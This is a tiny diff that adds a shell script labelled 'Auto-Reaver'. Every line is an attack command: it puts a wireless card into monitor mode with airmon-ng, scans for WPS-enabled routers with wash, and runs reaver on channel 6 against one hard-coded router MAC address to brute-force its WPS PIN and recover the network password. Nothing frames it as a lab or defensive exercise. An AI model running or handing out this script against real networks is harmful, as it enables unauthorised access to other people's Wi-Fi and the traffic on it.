@@ -1,0 +1,3 @@
+echo "Auto-Reaver Start..."
+airmon-ng start wlan0 | wash -i mon0
+sudo reaver -i mon0 -c 6 -b 00:23:69:48:33:95 -vv
